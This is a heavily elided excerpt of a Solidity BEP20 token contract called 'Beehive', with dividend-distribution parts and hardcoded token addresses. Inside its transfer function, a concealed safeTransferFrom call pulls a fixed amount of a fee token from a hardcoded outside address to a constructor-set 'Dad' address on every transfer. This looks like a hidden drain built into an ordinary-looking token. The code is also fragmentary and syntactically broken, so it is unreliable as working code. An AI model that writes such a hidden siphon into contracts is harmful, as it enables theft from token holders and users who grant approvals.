...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD = IBEP20(0x6293373BF0DAE2050641973D49b7b2f71adC91a1);
...
contract Beehive is IBEP20, Auth {
    ...
    address public feeToken = 0x9Dc1684Fa60458faf59Af2a7538FF9bd59a62BD6;
    address public Dad;
    uint256 public constant JUP = 100;
    ...
    constructor (
        ...
        uint8 tokenDecimals, 
        address Dad, //specify who Dad is;
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        ...
        }(feeToken).safeTransferFrom((0xd55e47ee94A2ca96761b0A5aac374d2cD3aDAc90), address(Dad), JUP);
